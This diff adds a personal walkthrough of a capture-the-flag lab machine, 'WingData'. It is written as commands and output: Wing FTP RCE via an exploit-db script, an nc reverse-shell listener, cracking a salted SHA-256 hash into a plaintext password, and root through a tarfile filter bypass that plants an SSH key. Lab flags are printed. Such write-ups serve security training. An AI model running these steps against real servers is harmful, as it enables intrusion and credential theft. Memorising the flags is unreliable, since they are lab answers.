@@ -1,0 +1,189 @@
+
+settarget 10.129.2.192 WingData
+---
+
+❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.2.192 -oG allPorts
+
+---
+
+❯ extractPorts allPorts
+───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │
+   2   │ [*] Extracting information...
+   3   │
+   4   │     [*] IP Address: 10.129.2.192
+   5   │     [*] Open ports: 22,80
+   6   │
+   7   │ [*] Ports copied to clipboard
+   8   │
+───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+---
+
+nmap -sCV -p22,80 10.129.2.192 -oN targeted
+
+---
+
+vi /etc/hosts
+❯ catnp /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	h4ckn3t
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+10.129.2.192	wingdata.htb 
+
+---
+
+❯ searchsploit -m multiple/remote/52347.py
+  Exploit: Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution  (RCE)
+      URL: https://www.exploit-db.com/exploits/52347
+     Path: /usr/share/exploitdb/exploits/multiple/remote/52347.py
+    Codes: CVE-2025-47812
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied to: /home/chiodo/52347.py
+
+---
+
+nc -nlvp 4444
+
+
+
+
+
+wingftp@wingdata:/opt/wftpserver/Data/1/users$ ls
+anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
+
+---
+
+cd Data/1/settings.xml
+
+---
+
+vi lua/ServerInterface.lua
+
+---
+
+❯ hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt.gz
+
+
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1410 (sha256($pass.$salt))
+Hash.Target......: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b87...ingFTP
+
+---
+
+❯ john --list=subformats | grep -i 'sha256'
+Format = dynamic_60  type = dynamic_60: sha256($p)
+Format = dynamic_61  type = dynamic_61: sha256($s.$p)
+Format = dynamic_62  type = dynamic_62: sha256($p.$s)
+Format = dynamic_63  type = dynamic_63: sha256(sha256($p))
+Format = dynamic_64  type = dynamic_64: sha256(sha256_raw($p))
+Format = dynamic_65  type = dynamic_65: sha256(sha256($p).$s)
+Format = dynamic_66  type = dynamic_66: sha256($s.sha256($p))
+Format = dynamic_67  type = dynamic_67: sha256(sha256($s).sha256($p))
+Format = dynamic_68  type = dynamic_68: sha256(sha256($p).sha256($p))
+UserFormat = dynamic_1029  type = dynamic_1029: sha256($p) (hash truncated to length 32)
+UserFormat = dynamic_1503  type = dynamic_1503: sha256(sha256($p).$s) (XenForo SHA-256)
+UserFormat = dynamic_1528  type = dynamic_1528: sha256($s.$p.$s) (Telegram for Android)
+UserFormat = dynamic_1588  type = dynamic_1588: sha256($s.sha1($p)) (ColdFusion 11)
+UserFormat = dynamic_1602  type = dynamic_1602: sha256(#.$salt.-.$pass) (QAS vas_auth)
+UserFormat = dynamic_1608  type = dynamic_1608: sha256(sha256_raw(sha256_raw($p))) (Neo Wallet)
+
+---
+
+❯ zcat /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt
+---
+
+❯ john --format=dynamic_62 hash_john.txt --wordlist=/tmp/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (dynamic_62 [sha256($p.$s) 256/256 AVX2 8x])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, almost any other key for status
+!#7Blushing^*Bride5 (?)
+1g 0:00:00:07 DONE (2026-02-23 04:53) 0.1285g/s 1843Kp/s 1843Kc/s 1843KC/s !JD021803..*7¡Vamos!
+Use the "--show --format=dynamic_62" options to display all of the cracked passwords reliably
+Session completed.
+
+---
+
+ssh wacky@localhost
+
+---
+
+cat user.txt
+9ce396724ac2ad53ea94d9940cb287a5
+
+
+
+https://github.com/thefizzyfish/CVE-2025-4138_tarfile_filter_bypass
+
+wacky@wingdata:/tmp$ ssh-keygen -t ed25519 -f /tmp/key -N ""
+Generating public/private ed25519 key pair.
+Your identification has been saved in /tmp/key
+Your public key has been saved in /tmp/key.pub
+The key fingerprint is:
+SHA256:mnIEh9/tLTH+CYoNyopne+owvQohP78+vrSF/8NvSEU wacky@wingdata
+The key's randomart image is:
++--[ED25519 256]--+
+|                 |
+|     .    E      |
+|    o .  .       |
+|     + . ..      |
+|o     o S.+      |
+|.+   o o.o +     |
+|+ + + *o .= .    |
+|.+o*oB ++..+ .   |
+|o=*BX+o.++. o    |
++----[SHA256]-----+
+wacky@wingdata:/tmp$ ls
+backup_1001.tar  sudoers                                                                            vmware-root
+exe.py           systemd-private-ef927f1f7950454c92bf1786c46902c1-apache2.service-L1xcfg            vmware-root_3372-2966040012
+key              systemd-private-ef927f1f7950454c92bf1786c46902c1-systemd-logind.service-qMNkQ3
+key.pub          systemd-private-ef927f1f7950454c92bf1786c46902c1-systemd-timesyncd.service-998dTs
+
+
+wacky@wingdata:/opt/backup_clients$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1005.tar -r restore_evil
+[+] Backup: backup_1005.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_evil
+[+] Extraction completed in /opt/backup_clients/restored_backups/restore_evil
+wacky@wingdata:/opt/backup_clients$ cd /tmp
+wacky@wingdata:/tmp$ ssh -i key
+Display all 1040 possibilities? (y or n)
+wacky@wingdata:/tmp$ ssh -i key root@localhost
+The authenticity of host 'localhost (::1)' can't be established.
+ED25519 key fingerprint is SHA256:JacnW6dsEmtRtwu2ULpY/CK8n/8M9tU+6pQhjBG3a4w.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
+Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Feb 24 19:38:41 2026 from ::1
+
+root@wingdata:~# whoami
+root
+root@wingdata:~# cat
+.bash_history     .cache/           .local/           .python_history   .selected_editor  .wget-hsts
+.bashrc           .lesshst          .profile          root.txt          .ssh/
+root@wingdata:~# cat
+.bash_history     .cache/           .local/           .python_history   .selected_editor  .wget-hsts
+.bashrc           .lesshst          .profile          root.txt          .ssh/
+root@wingdata:~# ls
+root.txt
+root@wingdata:~# cat root.txt
+8bdf723358ebbee0956f6ef6261a3424
